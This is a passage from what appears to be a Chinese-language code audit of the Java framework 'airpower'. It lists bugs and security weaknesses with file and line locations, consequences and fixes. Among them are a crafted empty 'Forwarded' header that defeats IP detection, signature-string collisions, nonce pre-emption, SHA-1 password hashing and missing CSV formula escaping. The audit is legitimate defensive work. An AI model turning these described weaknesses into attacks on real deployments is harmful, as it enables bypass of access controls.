| D4 ⚠️ | 缓存 key 用 `getSimpleName()`                 | `RedisHelper.java:413-416`                   | `com.a.user.User` 和 `com.b.order.User` 同名同 id → key 都是 `User_1`，**缓存串号、锁互相阻塞**；实体是 JPA 代理时 key 永远对不上，缓存和锁全部失效         |
| D5 ⚠️ | `set(key, value, 0)` 会无限递归                 | `RedisHelper.java:381-392`（`:386` 递归自己）      | 若 `cache-expire-second` 也配成 0 → `set(0)` → `set(0)` → … → `StackOverflowError`，请求直接 500                               |
| D6 ⚠️ | `hasKey` 吞异常返回 `false`                     | `RedisHelper.java:326-332`                   | Redis 一抖动，"幂等校验 / 防重放"就全部放行 —— **安全校验被静默绕过**                                                                          |
| D7 ⚠️ | `releaseLock` 在 `finally` 里，Redis 异常顶掉业务异常 | `RedisHelper.java:62-64`                     | 业务抛的"库存不足"被替换成"REDIS服务连接失败"，**真实原因彻底丢失**                                                                              |

### E. WebSocket / MQTT（8 条）

|   #   | 问题                                                                 | 位置                                                                                   | 后果                                                                                                                                                                                                                               |
|:-----:|--------------------------------------------------------------------|--------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| E1 ✅  | **MQTT 模式完全不可用**：`try (MqttClient ...)` 把刚订阅好的 client 立刻 `close()` | `WebSocketHandler.java:224-249`                                                      | `MqttClient` 实现了 `AutoCloseable`，`try` 块一结束就 `close()`，而 `mqttClientHashMap.put` 在块内 —— **put 进去的 client 当场被销毁**。前端显示"连接成功"但一条消息都收不到                                                                                             |
| E2 ✅  | MQTT 订阅 topic 漏了 `channelPrefix` 前缀                                | 订阅 `WebSocketHandler.java:243-245` vs 发布 `WebSocketHelper.java:96`                   | 发布端推 `airpower:_WEBSOCKET_ALL`，订阅端订裸的 `WEBSOCKET_ALL` —— **名字对不上，100% 收不到**。同文件的手动订阅 API 加了前缀，只有自动订阅漏了                                                                                                                           |
| E3 ✅  | Redis 消息监听器**从不反注册**                                               | 注册 `WebSocketHandler.java:199-214`；`afterConnectionClosed:266-283` 只关了连接和 client     | 连 1000 次又全断开 → 容器里堆 2000 个监听器，每个 lambda 闭包**强引用着已关闭的 session**。内存泄漏 + 每次广播依次投递给 2000 个死 session 全部抛 `IOException` → **广播耗时随历史连接数线性增长，日志被 ERROR 刷爆**                                                                              |
| E4 ✅  | `sendWebSocketPayload` 不加锁，和回调里的 `synchronized(session)` 不是同一把锁    | `WebSocketHandler.java:110-118` vs `:201/209/232`                                    | 两个线程同时对同一 session `sendMessage` → 轻则消息字节交错成乱码，重则抛 `concurrently written by another thread`。那三处 `synchronized` 给了"已经加过锁"的错觉                                                                                                       |
| E5 ✅  | 固定 4 线程池 + 锁内阻塞写                                                   | `RedisPubSubConfig.java:17`（`newFixedThreadPool(4)`）、`WebSocketHandler.java:200-214` | 4 个弱网客户端就能占满 4 个派发线程 → **全站所有 WebSocket 用户收不到任何推送**，包括网络正常的                                                                                                                                                                      |
| E6 ✅  | 自建线程池不随容器销毁关闭                                                      | 同上                                                                                   | `RedisMessageListenerContainer.destroy()` 只在 `manageExecutor && taskExecutor instanceof DisposableBean` 时销毁；`setTaskExecutor()` 不会改 `manageExecutor`，而 `newFixedThreadPool` 返回的池不是 `DisposableBean` → **优雅停机时线程不退出，JVM 卡住直到被强杀** |
| E7 ✅  | 入站消息整条原文进 INFO 日志 + 业务异常被误报为"解析失败"                                 | `WebSocketHandler.java:100`、`:126`、`:96-102`                                         | ① 任何人连上发 10 万条垃圾字符串，日志就多 10 万行原文（含换行 → **日志注入**，可伪造假日志行）；② 业务 NPE 被打成"解析 WebSocket 负载失败"，排查方向完全错；③ 客户端收不到任何反馈                                                                                                                    |
| E8 ⚠️ | MQTT 每发一条消息新建 + 断开一条 TCP；`cleanSession=false` + 随机 clientId        | `MqttHelper.java:55`、`:30`、`:80`                                                     | ① 每次发布跑完整「建 TCP → CONNECT → PUBLISH → DISCONNECT」；② `cleanSession=false` 表示要求 broker 保留会话，**每发一条消息就在 broker 上永久留一条垃圾会话**，跑几天撑爆磁盘。文档自己写了"不建议高频调用"，而 `WebSocketHelper` 每条广播都在调                                                     |

### F. HTTP 与日志（4 条）

|   #   | 问题                                          | 位置                                                             | 后果                                                                                                                                                                                                    |
|:-----:|---------------------------------------------|----------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| F1 ✅  | `printLog` 无条件执行，两个开关都关也照打；headers 无开关保护    | `CurdResponseInterceptor.java:99`、`:130-143`                   | 与 P0-3 同源，见那里的修法                                                                                                                                                                                      |
| F2 ✅  | **11 个 jar 各打包一份同名 `logback-spring.xml`**   | 11 个模块 `src/main/resources/logback-spring.xml`（`md5` 完全相同）     | 业务引入 ≥2 个 airpower 模块（如 `airpower-curd` 传递带入 `api`/`cookie`/`redis`/`exception`）→ classpath 上有 5+ 份同名配置，**日志级别和格式被库的 `root INFO` + Console 强制覆盖**，业务自己的 appender 静默失效。已核实 6.0.0~8.0.1 所有历史 jar 都有这个问题 |
| F3 ⚠️ | 所有异常都返回 HTTP 200                            | `ExceptionInterceptor.java:47-49`（类上 `@ResponseStatus(OK)`）    | 未登录是 200+code401，数据库炸了是 200+code500 → **APM / 网关 / WAF / 告警规则看到的永远是 100% 成功率，5xx 告警永不触发**                                                                                                             |
| F4 ⚠️ | `Forwarded: for=""` 让 IP 解析抛异常，返回 `unknown` | `RequestUtil.java:228-263`（`parseAddress` 中 `ip.charAt(0)` 越界） | 攻击者加一个 `Forwarded: for=""` 头，这一条请求的真实 IP **完全丢失**，且不再尝试备用的 `X-Real-IP`。IP 白名单若把 `unknown` 当放行 = 一次白名单绕过                                                                                               |

**F2 的修法**：库 jar 里**不要放** `logback-spring.xml`。删掉这 11 个文件，改为在文档里给出建议片段让业务自己放：

```xml
<!-- 业务项目自己的 logback-spring.xml -->
<include resource="org/springframework/boot/logging/logback/defaults.xml"/>
<include resource="logback-airpower.xml"/>  <!-- 库提供的片段，只含 pattern，不含 root level -->
```

### G. 异常与配置（2 条）

|   #   | 问题                                            | 位置                            | 后果                                                                                                                                |
|:-----:|-----------------------------------------------|-------------------------------|-----------------------------------------------------------------------------------------------------------------------------------|
| G1 ⚠️ | `Errors` 是全局单例，`setMessage` 会**永久**改掉错误文案     | `Errors.java:88`、`:96-100`    | 某处写 `PARAM_INVALID.setMessage("手机号已存在").when(...)` → 第一个请求进来就把全局文案改了，**之后所有请求**的"请求参数验证失败"都变成"手机号已存在" → 用户 A 的字段名泄漏给用户 B；多线程还互相覆盖 |
| G2 ⚠️ | `PermissionUtil.encodePassword` 用 SHA-1 做密码散列 | `PermissionUtil.java:222-228` | SHA-1 为速度设计，现代 GPU 每秒几十亿次；无迭代次数。撞库几乎无成本。作为框架"默认密码工具"极易被直接采用 → 应换 BCrypt / Argon2（注意存量数据需双轨过渡）                                     |

### H. 开放平台与 AI / MCP（15 条）

|   #    | 问题                                                    | 位置                                                                                              | 后果                                                                                                                                                                                                                                       |
|:------:|-------------------------------------------------------|-------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| J1 ⚠️  | **MCP 工具参数按 key 字母序拼位置参数**                            | `McpService.java:199-209`                                                                       | Java 形参是**声明顺序**。写 `searchUser(String keyword, String city)`，模型传 `{"keyword":..,"city":..}` 排序后可能正好对上；但一旦模型按 inputSchema 传 `q`/`page` 而形参叫 `keyword`/`pageSize`，就**静默传错参数**（查 A 用户返回 B 用户的资料）。必须按 `Method.getParameters()` 的声明顺序取值并做类型转换 |
| J2 ⚠️  | **MCP 全部异常被吞，权限拒绝变 `isError:false` 的"成功"**            | `McpService.java:192-220`                                                                       | `try { ... } catch (Exception e) { callResult = e.getMessage(); }` 把 `checkPermission.accept()` 也包住了。业务抛出的"无权限"变成 `200 + {"isError":false,"text":"无权限: deleteUser"}`，**AI Agent 以为删除成功了**；SQL 异常、文件路径、连接串也原样回给调用方                        |
| J3 ⚠️  | 错误响应根本不是 JSON-RPC 格式，`McpError` 是死代码                  | `McpService.java` 全文、`McpResponse.java:38-58`                                                   | 没有任何一行代码给 `error` 字段赋值，错误全走框架的 `{code,message,data,traceId}` 格式 → **标准 MCP 客户端解析失败**                                                                                                                                                     |
| J4 ⚠️  | `id` 只支持数字，不支持字符串 id / 通知 / 批量                        | `McpJson.java:22`                                                                               | 客户端用 UUID 做 id 时绑定失败；通知（无 id）被回一个 `id:0`；批量请求直接绑定异常                                                                                                                                                                                      |
| J5 ⚠️  | 上游非 200 时输入流不关 + 每次都 `new HttpClient`                 | `Ai.java:157-166`、`:186-189`                                                                    | body 的 `InputStream` 一次没读也没关，socket 挂在连接池上；Java 17 的 HttpClient 无终结器可靠回收 → **大模型一抖动返回几个 429/500，线程数一路涨**                                                                                                                                 |
| J6 ⚠️  | 流式与同步请求都没有读超时                                         | `Ai.java:186-189`（连 connectTimeout 都没设）、`:70-73`                                                | 模型 thinking 卡住或对端连上不发数据，`readLine()` 一直阻塞 → 几十个卡住的流就能把服务打挂（`Docs.md:250` 自己承认了但只是"建议自行替换"）                                                                                                                                               |
| J7 ⚠️  | `Objects.requireNonNull(message.getContent(), "")` 误用 | `AiResponse.java:70`、`:87`                                                                      | 第二个参数是**抛异常时的信息**，不是默认值。模型返回 tool_calls 或触发内容过滤导致 content 为 null 时，这里抛 NPE 而不是返回空串                                                                                                                                                       |
| J8 ⚠️  | `enableThinking` 被配置无条件覆盖                             | `Ai.java:174-179`                                                                               | `AiRequest` 暴露了 public 字段和链式 setter，开发者 `setEnableThinking(true)` 写一圈，真正发出去的仍是配置值。而 `model`/`maxToken` 用的是 `requireNonNullElse`（尊重调用方）—— 三个字段三套逻辑                                                                                        |
|  J9 ✅  | 签名串是无分隔符裸拼                                            | `OpenRequest.java:131`                                                                          | `appSecret+appKey+version+timestamp+nonce+content` 直接相连。`nonce="ab",content="X"` 与 `nonce="a",content="bX"` 拼出同一串、**签名完全相同**。且是 `sha1(密钥‖消息)` 结构，SHA-1 长度扩展攻击原理上适用                                                                       |
| J10 ✅  | 签名比较不是恒定时间                                            | `OpenRequest.java:122`                                                                          | `whenNotEquals()` 反编译确认走 `String.equals`，第一个不同字节就返回。（跨公网实战难度高，故 P1 而非 P0，但两行就能修）                                                                                                                                                         |
| J11 ✅  | nonce 三个问题叠加：**先登记后验签** + key 不带 appKey + 先查后写非原子     | `OpenApiAspect.java:103`（先执行）vs `:68`（后验签）；`:160-163`                                           | ① 攻击者无需任何密钥就能抢占别人的 nonce 做定向拒绝，还能无限灌 `open:nonce:*` 撑爆缓存；② key 是 `open:nonce:<nonce>` 全局共享，多应用随机性撞车即互相顶掉；③ `get` 后 `set` 有窗口期，并发下防重放失效。应先验签，再用 `setIfAbsent(key含appKey, ...)` 一步完成                                                       |
| J12 ⚠️ | 切面只对返回 `Json` 的方法加密                                   | `OpenApiAspect.java:70-73`                                                                      | 返回 `String`、POJO、`ResponseEntity`、`Map`，或走全局异常处理器时，响应**一律不加密**。客户端按协议解密拿到乱码，开发者完全看不出来                                                                                                                                                    |
| J13 ⚠️ | `OpenRequest` 时间戳为空直接 NPE                             | `OpenApiAspect.java:102,112`                                                                    | `Long` 拆箱 `long`，而 `Docs.md:101` 的示例方法**没有 `@Valid`** → `OpenRequest` 上那一堆 `@NotNull/@NotBlank` 全都没生效，null 一路传到拆箱 → **照官方文档写的代码，参数错误会打成 500**                                                                                            |
| J14 ✅  | `AesUtil` 复用非线程安全的 `Cipher` 实例                        | `airpower-core` 的 `AesUtil`（`javap` 实证：`ConcurrentHashMap<Integer,Cipher>` + `computeIfAbsent`） | JDK 文档明确 `Cipher` 不是线程安全的。多线程并发加解密会互相破坏内部状态，产生错乱数据或异常。应在每个 `encrypt`/`decrypt` 内部 `Cipher.getInstance` 新建                                                                                                                                |
| J15 ⚠️ | MDC 写了不清，且写的 key 现在没人读                                | `McpService.java:171`                                                                           | `MDC.put(CURRENT_USER_ID, ...)` 后无 `MDC.remove` → Tomcat 线程复用，**上一个请求的用户 ID 挂到后面所有请求上**，审计日志张冠李戴。且 `getCurrentUserId()` 已改读 `request.getAttribute`，这个 key 彻底失效                                                                           |

**J2 的修法**（权限校验移出 try，异常按 JSON-RPC 回 `error`）：

```java
// 权限校验放在 try 之外，异常直接向上抛，绝不伪装成成功
checkPermission.accept(mcpTool);

Object callResult;
try{
Object bean = beanFactory.getBean(method.getDeclaringClass());
callResult =method.

invoke(bean, buildArgs(method, arguments));
        }catch(
InvocationTargetException e){
Throwable cause = e.getTargetException();
    if(cause instanceof
ServiceException se){
        throw se;                                  // 业务异常按原样抛
    }
            log.

error("MCP 工具执行失败 tool={}",mcpTool.getName(),cause);
        return responseData.

setResult(new McpResponseResult()
            .

setIsError(true)
            .

addTextContent("工具执行失败，请联系管理员"));   // 不回显内部消息
        }
```

---

## 三、P2 —— 顺手修（47 条）

### 代码质量与一致性

|   #    | 问题                                                                                                                        | 位置                                                             |
|:------:|---------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------|
| H1 ⚠️  | 排序字段无白名单：敏感列可作为排序侧信道；字段不存在时把实体内部字段名回显给客户端                                                                                 | `QueryHelper.java:100-121`、`ExceptionInterceptor.java:208-214` |
| H2 ⚠️  | `LIKE` 查询不转义 `%` 和 `_`：搜 `%` 匹配全表；`@Search` 标在数值字段上直接生成非法 SQL                                                             | `QueryHelper.java:189-200`                                     |
| H3 ⚠️  | 过滤器字段类型不匹配变成数据库报错（前端传 `"2024-01-01"` 给 `Long` 类型的 `createTime`）                                                           | `QueryHelper.java:185`、`:203`                                  |
| H4 ⚠️  | 返回 `PageData`（而非 `QueryPageResponse`）时整个分页被清空成 null                                                                       | `CurdResponseInterceptor.java:294`                             |
| H5 ⚠️  | `PageData.total` 用 `int` + `Math.toIntExact`，超 21 亿行的表直接抛异常                                                               | `PageData.java:57`、`QueryPageResponse.java:36`                 |
| H6 ⚠️  | `@Search` / `@SearchEmpty` 声明了 `METHOD` 目标但代码只从字段读，标在 getter 上静默失效                                                        | `Search.java:17`、`QueryHelper.java:150`                        |
| H7 ⚠️  | `@Desensitize` 判定用 `contains(符号)`，昵称里含 `*` 的合法值会被静默丢弃                                                                     | `RootService.java:66-89`                                       |
| H8 ⚠️  | 脱敏判定只做"是否为 token 字符串"的近似判断；`checkUnique` 先查后插，并发可穿透 + 每唯一字段一条 SQL                                                         | `RootService.java`、`CurdService.java:877-910`                  |
|  H9 ✅  | `filterPage` 参数误用 `jakarta.validation.constraints.Null` 校验注解，与其它重载的 `@Nullable` 语义相反                                      | `CurdService.java:384`                                         |
| H10 ✅  | `CurdEntity` setter 一半返回 `E`（手写 4 个）、一半返回 `void`（Lombok 生成），链式调用写不下去                                                      | `CurdEntity.java:37-38` vs `:87-124`                           |
| H11 ⚠️ | `@EqualsAndHashCode(callSuper=true)` 覆盖全字段，实体放进 Set 后懒加载一变 `hashCode` 就变，`remove` 返回 false                                | `CurdEntity.java:34`                                           |
| H12 ✅  | `createSpecification` 标 `@Contract(pure=true)` 却捕获可变的 `this`；`getUpdateIgnoreFields` 会遍历到只读的 `class` 属性                   | `CurdService.java:960`、`:918-940`                              |
| H13 ⚠️ | `QueryPageResponse.newInstance(Page)` 是死代码，与 `from(PageData)` 完全重复                                                        | `QueryPageResponse.java:33-43`                                 |
| H14 ⚠️ | `TransactionHelper` 的 `run(Function)` / `run(Supplier)` 重载对 `() -> repository.save(x)` 这种 lambda **引用不明确、编译不过**           | `TransactionHelper.java:22-43`                                 |
| H15 ⚠️ | `TransactionHelper` 默认 `REQUIRED`，调用方在事务内 catch 掉异常不重抛 → **半成品数据照样提交**                                                    | `TransactionHelper.java:22`、`:32`                              |
| H16 ⚠️ | `Curd.getCurdList` 传 null 会 NPE；`@Extends` 的 Javadoc 与实现（并集 / 去重）不符                                                       | `Curd.java:101-121`、`Extends.java:11-17`                       |
| H17 ✅  | `Curd.getCurdList` 默认全开 10 个接口；`getDetail` 只有后置钩子、无法做行级数据权限                                                               | `Curd.java:102-105`、`CurdController.java:132-137`              |
| H18 ⚠️ | `AccessConfig.authorizeExpireSecond` 全仓零引用（死配置），但 `Docs.md:52` 把它写成"默认有效期"并给了 yaml 示例                                     | `AccessConfig.java:21`                                         |
| H19 ⚠️ | `ApiConfig.isServerRunning` 是零引用的 public static 可变全局量；`@Value("${spring.mail.username: ''}")` 默认值把引号也带进去了                 | `ApiConfig.java:20`、`EmailHelper.java:27`                      |
| H20 ⚠️ | `Errors.get()` 覆盖后返回 `message=null` 的异常（比接口默认实现倒退）；`FORBIDDEN_DISABLED` 的 message 是 printf 模板，`getLabel()` 返回给前端就是一串 `%s` | `Errors.java:119-123`、`:46`                                    |
| H21 ⚠️ | 11 个模块的 `Auto` 都用 `@ComponentScan`（官方不建议在自动装配里用）、无 `@ConditionalOnClass`、无 `proxyBeanMethods=false`、4 个类重名                | 各模块 `Auto.java`                                                |
| H22 ⚠️ | 邮件正文纯字符串拼 HTML，`code` / `sign` 零转义（可做钓鱼内容）                                                                                | `EmailHelper.java:43-55`                                       |
| H23 ⚠️ | 密钥配置类用 `@Data` → `toString()` 会把云密钥打出来（actuator `/configprops` 也会吐）                                                       | `AliyunOssConfig.java:12`、`TencentCloudCosConfig.java:12`      |
| H24 ⚠️ | `MqttHelper` / `FileHelper` / `AbstractFilePlatformFactory` 标 `@Configuration` / `@Service`（语义误导），且用字段注入无法单测              | `MqttHelper.java:17`、`FileHelper.java:32`                      |
| H25 ⚠️ | `@Api` 注解无法限定 method / produces / consumes；类级路径对所有 HTTP 方法开放                                                              | `annotation/Api.java:26-34`                                    |
| H26 ⚠️ | `mapToQueryString` 不做 URL 编码，`&` / 空格会被解析成额外参数                                                                            | `RequestUtil.java:450-454`                                     |
| H27 ⚠️ | 多个 `Boolean` 配置字段可为 null，消费侧 `!apiConfig.getRequestLog()` 直接 NPE                                                          | `ApiConfig.java:27`、`:39`、`:44`                                |
| H28 ⚠️ | `accessTokenSecret` 无默认值也无启动校验，忘配则服务正常启动但所有接口 401                                                                         | `ApiConfig.java:49`                                            |
| H29 ⚠️ | `Errors` 注释说"502 内部错误代码"但常量是 5021/50211/50212，且 4031 之后出现 404，编号体系自相矛盾                                                    | `Errors.java:68-84`                                            |
| H30 ⚠️ | `CurdUtil.scanEntity` 扫不到不以 `Entity` 结尾的实体（静默漏掉）；`Class.forName` 未指定类加载器；整个扫描被一个 try 包住，**一个类出错全批丢失**                     | `CurdUtil.java:48`、`:57`、`:100-102`                            |
| H31 ⚠️ | `PermissionUtil.baseIdentity` 用 `replace` 全局替换，包名含 `controllers` 会被改坏                                                     | `PermissionUtil.java:101`                                      |

### 开放平台与 AI / MCP（16 条）

|   #    | 问题                                                                                                                                                | 位置                                |
|:------:|---------------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------|
| K1 ⚠️  | `MISSING_REQUEST_ADDRESS.show()` 后没有 `return`，全靠"`show()` 一定会抛"这个隐含约定读懂控制流。建议在 `IException` 上给 `show()` 加 `@Contract(" -> fail")`                 | `OpenApiAspect.java:148-149`      |
| K2 ⚠️  | IP 白名单只按 `\n` 切分。运维习惯用逗号/分号分隔，配了 `1.1.1.1,2.2.2.2` 会被当成一整串 → **所有请求全被拒**且报错是"不在白名单内"，排查方向完全错                                                      | `OpenApiAspect.java:145`          |
| K3 ⚠️  | `NONCE_CACHE_SECOND`（防重放时长）被复用成时间戳容忍窗口，两个概念混在一个常量里，改一个意外影响另一个                                                                                     | `OpenApiAspect.java:38,114`       |
| K4 ⚠️  | 切面是泛型 `OpenApiAspect<S extends IOpenAppService>` 且直接 `@Autowired`；应用里出现多个实现就 `NoUniqueBeanDefinitionException`                                    | `OpenApiAspect.java:46`           |
| K5 ⚠️  | `McpService.tools` 是 public 可变静态字段，且直接塞进 `Map.of(...)` 返回给外部，任何拿到引用的代码都能改框架的工具清单                                                                  | `McpService.java:50,223`          |
| K6 ⚠️  | `scanMcpMethods` 重复调用时 `METHOD_MAP` 从不清理 → 旧的、这轮没扫到的方法**仍可被调用**（幽灵方法），`tools/list` 与实际可调用集对不上                                                     | `McpService.java:50,62-73`        |
| K7 ⚠️  | 两个类的 `@McpMethod("同名")` 时 `tools` 里有两条重名记录、`METHOD_MAP` 后者覆盖前者（行为取决于扫描顺序）                                                                         | `McpService.java:66-72`           |
| K8 ⚠️  | `log.info("MCP 请求方法: {}，参数: {}")` 在 INFO 打印完整 params，`tools/call` 的 arguments 里往往装着用户查询词、手机号                                                      | `McpService.java:178`             |
| K9 ⚠️  | 权限标识用 `sha1Hex(工具名+描述)` 推导：**改一下工具的注释描述，所有已授权的权限标识全变**，线上集体失权；且完全由公开信息派生，anyone 都能算出来                                                             | `McpService.java:143`             |
| K10 ⚠️ | `try (outputStream; outputStream)` 同一流声明了两次（close 两次），且 `outputStream` 由 Spring 管理生命周期，业务不该关                                                      | `Ai.java:92`                      |
| K11 ⚠️ | `new InputStreamReader(inputStream)` **未指定字符集**，用 JVM 平台默认编码。target 是 17，服务器 `LANG=C` 时模型返回的中文全是乱码，而输出端却写死 UTF-8                                  | `Ai.java:94`                      |
| K12 ⚠️ | `line.replace(FLAG_STREAM_DATA, "")` 会把正文里出现的 `"data: "` 也删掉，应该只切前缀 `substring`                                                                   | `Ai.java:135`                     |
| K13 ⚠️ | `AiRequest` 构造函数私有 + `prompt()` 静态工厂 → **无法创建不带 system 提示词的请求**，也无法在对话中途追加 system/tool 消息（`addMessage(AiMessage)` 是 private）                      | `AiRequest.java:45-61`            |
| K14 ⚠️ | `Docs.md:75,86` 示例写的是 `addMessage(AiRole.USER, userInput)`，但 `AiRequest` **根本没有这个两参重载**，照抄编译不过                                                    | `airpower-ai/Docs.md`             |
| K15 ⚠️ | 两个模块 pom 都声明了 `<arg>-parameters</arg>`，但 `Docs.md` 完全没告诉使用者"**你的业务模块也必须加这个编译参数**"，否则 MCP 工具形参名退化成 `arg0`/`arg1` 或抛 `MalformedParametersException` | `airpower-ai/pom.xml` + `Docs.md` |
| K16 ⚠️ | `McpResponseContent` 声明成包级私有，却出现在 public 类 `McpResponseResult` 的 public 字段泛型参数里 → 外部包无法引用，Jackson 之外的序列化框架会直接炸                                    | `McpResponseResult.java:58`       |

### 工程与构建（6 条）

|  #   | 问题                                                                                                                                                                                                                                 | 证据 |
|:----:|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----|
| I1 ✅ | **全库 0 个测试**（无任何 `src/test` 目录）。9395 行的基础库，核心写路径（`withNull`、钩子、事务）全靠人工验证 —— P0-7 正是这么漏出去的                                                                                                                                          |
| I2 ✅ | **GPG 签名 + `central-publishing-maven-plugin` 默认启用**（`autoPublish=true`，keyname 硬编码在 POM 第 218 行），且 11 个子模块各重复声明一遍这 5 个插件。任何人没装 GPG 密钥就 `mvn install` 直接失败。应全部移入 `release` profile                                                  |
| I3 ✅ | 依赖坐标 `mysql:mysql-connector-java` **官方已废弃**（应为 `com.mysql:mysql-connector-j`），升驱动时会卡死；且库不该强依赖具体数据库驱动，应 `optional`                                                                                                                  |
| I4 ✅ | `airpower-file` 把阿里云 `aliyun-sdk-oss 3.17.4` 和腾讯 `cos_api 5.6.227` 都作为**强依赖**（版本还硬编码在子 POM、不在父 `dependencyManagement`）；`airpower-redis` 同时引入 Lettuce 与 Jedis 两套客户端。所有用户都得下载、且引入 `airpower-websocket` 就必须有 Redis（`support=NO` 也起不来） |
| I5 ✅ | 版本发布脱节：项目版本 `8.0.1`，但最新 tag 是 `v5.0.2`；`airpower-core` 锁在 `7.0.0`（差一个大版本，P0-1 的根因）；分支 `dev`/`main`/`x`/`v1.x`~`v5.x` 并存                                                                                                            |
| I6 ✅ | 无 CI（无 `.github`）、无 Maven Wrapper（无 `.mvn`）、无 enforcer / checkstyle / spotbugs / jacoco；`dependencyManagement` 里声明了一个**根本不存在**的 `airpower-web` 模块；`scm` 用的 `git://` 协议已被 GitHub 弃用                                                 |

---

## 四、已确认「不存在」的问题（不必重复排查）

这些是逐行读完 + 交叉验证后**确认安全**的点，写下来是为了避免下一轮审计重复劳动，也是为了说明问题的边界在哪。

### 数据与查询

1. **没有 SQL 注入**。所有查询走 JPA Criteria / `JpaSpecificationExecutor`，谓词值一律参数绑定；`root.get(field.getName())`
   传的是**反射拿到的实体字段名**，不是用户输入。全仓没有任何把用户输入拼进 JPQL / SQL 的地方。
2. **批量赋值（改别人的字段）被挡住了**。`CurdController.add/update` 反序列化后立刻 `excludeReadOnly()`，`isDisabled` /
   `createTime` / `updateTime` 都标了 `@ReadOnly`，客户端无法通过 JSON 改写系统字段。
3. **分组校验是生效的**。`@Validated(WhenAdd/WhenUpdate/WhenIdRequired)` 配合字段上的分组注解走 Spring 的
   `SmartValidator` 代理，缺 `id` 返回 400 而不是 NPE。
4. **分页数学没错**。`pageNum` 1-based ↔ `PageRequest` 0-based 转换正确；`pageSize` 做了 `min`/`max` 双向钳制；`pageCount`
   直接取 Spring 的 `getTotalPages()`。
5. **事务嵌套是安全的**。`TransactionHelper` 用默认 `REQUIRED`，`add → addToDatabase → saveToDatabase` 会合并成同一事务，
   `rollbackFor = Exception.class` 保证受检异常也回滚。
6. **权限失败是「拒绝」不是「放行」**。`checkUserPermission` 默认实现直接抛异常，是 fail-closed。（前提是拦截器被注册 —— 见
   P0-2。）
7. **CSV 导出没有做 RFC 4180 转义，也完全没有中和 `= + - @` 公式前缀**。已用 `javap` 读 `airpower-core-7.0.0` 的
   `CollectionUtil` 字节码确认：字符串常量只有 `,`、`-`、`\n`、`是`、`否`，全程只有 2 处 `String.replace`，无 `startsWith("=")`
   判断、无加 `'` 前缀。**这是 P1 级缺陷，不是"已防护"**（子代理曾给出相反结论，此处已纠正）。
8. **没有 `Pageable` 放大器**。`pageSize` 双向钳制、`pageNum` 有下界保护，前端传 `pageSize=999999999` 只会被夹到
   `maxPageSize`。

### 安全

9. **git 历史里没有硬编码密钥**。`git log --all -p` 全量扫过 password / secret / apiKey / accessKey 赋值模式，零命中。
10. **代码里没有硬编码凭据**。`accessKeyId` / `accessKeySecret` / `secretId` / MQTT `user`/`pass` 默认值全为空串；SMTP
    完全交给 `spring.mail.*`。
11. **令牌伪造不成立**。`AccessTokenUtil.verify` 在密钥为空时**直接抛异常**（已读 7.0.0 字节码确认），不存在"没配密钥就放行"
    ；HMAC 覆盖了过期时间与 payload。
12. **没有 JSON 多态反序列化（gadget）风险**。`Json.parse(str, Class)` 传的是具体 Class，ObjectMapper 未开 default typing。
13. **不存在 CORS 凭据通配**。全仓 `@CrossOrigin` / `CorsRegistry` / `addCorsMappings` 零命中。
14. **不存在可直接利用的 CSWSH**。WebSocket 对 Origin 零校验，但握手强制要求 URL 里的 token，而浏览器 WebSocket API **不会自动带
    Cookie** → 攻击者页面拿不到令牌。这是"缺失的第二道防线"，不是现成攻击链（故 P1 而非 P0）。⚠️
15. **IP 解析不会触发 DNS 查询**。IPv6 字面量要求首字符是十六进制或冒号才交给 `InetAddress.getByName`，IPv4 走自研解析并拒绝
    `1.2.3`、`010.1.1.1`、`1.2.3.4.5` 等歧义写法 → 无 DNS rebinding / SSRF 放大。
16. **文件名本身无法做路径穿越**。最终文件名 = `MD5 + "." + 最后一个点之后的片段`，片段永远不可能以 `.` 开头，构不成 `..`
    路径段。**真正的洞在目录参数**（P0-4）。
17. **本库不会造成"任意文件下载"**。全仓无 `WebMvcConfigurer` / `addResourceHandlers` / 静态资源映射；目录能否被当静态资源访问取决于业务自己的配置。
18. **`curl` 收件人注不进去**。`setTo` 走 `InternetAddress.parse(address, true)` 严格模式，`\r\n` 会直接抛异常 —— 唯一注入点是
    `Subject`（P0-6）。
19. **`JavaMailSender` 不需要关也不该关**，Spring 单例线程安全，每次 `send()` 内部自己开关连接。

### 资源与并发

20. **curl 模块内没有自己持有的未关闭流**。`FileUtil.saveFile` 内部用 `Files.write`（自动关闭）；`getFileHash` 两处都用了
    try-with-resources。（`upload` 两个重载漏关已列为 C4。）
21. **OSS / COS 客户端的懒加载 + 关闭是正确的**。双重检查加 `volatile` 不会建出两个客户端，`@PreDestroy` 会
    shutdown，注入的是配置对象而非客户端 → **没配密钥也不会导致启动失败**。
22. **`afterConnectionClosed` 里 `Objects.nonNull(map.get(id))` → `map.remove(id).close()` 在并发下是安全的**。看起来是
    check-then-act，但 `ConcurrentHashMap.remove` 是原子的，一个线程拿到对象、另一个拿到 null 被 `nonNull` 挡住，不会 NPE。
23. **Redis Pub/Sub 跨实例广播语义正确**。用的是 `convertAndSend`，发布节点自己也会收到。
24. **Maven 依赖树里没有重复类**（`airpower-file` 同时引入阿里云和腾讯 SDK 属于依赖冗余但无冲突）。

### 开放平台与 AI / MCP

25. **AI 的 API Key 没有硬编码，也没有被 AI 模块打进日志**。`AiConfig.key` 无默认值、只从 `airpower.ai.key` 读；`Ai.java`
    全文没有任何 `log` 碰 `aiConfig.getKey()` 或 Authorization 头。⚠️ 但有个相邻隐患：core 的 `HttpUtil.toString()` 会把
    headers 一起拼进去，谁写一句 `log.error("req={}", httpUtil)` 就会连带把 `Bearer <key>` 吐出来。
26. **上游 AI 服务的错误响应体没有回传给调用方**。`Ai.java:74` 非 200 时直接抛异常，`httpResponse.body()` 没进入任何
    `ServiceException` 消息。
27. **MCP 的反射调用没有越权面**。`METHOD_MAP` 只放启动期扫描注册的 `@McpMethod`，且从 Spring 容器取真实 Bean —— 攻击者无法通过
    `name` 参数调到任意方法。这是这块设计对的地方。
28. **`McpErrorCode` 的错误码取值完全符合 JSON-RPC 2.0 规范**（-32700 ~ -32603）。
29. **AI / MCP 模块没有 SQL 注入、命令执行、反序列化 RCE 面**。无 `Runtime.exec`、`ProcessBuilder`、原生 SQL 执行、
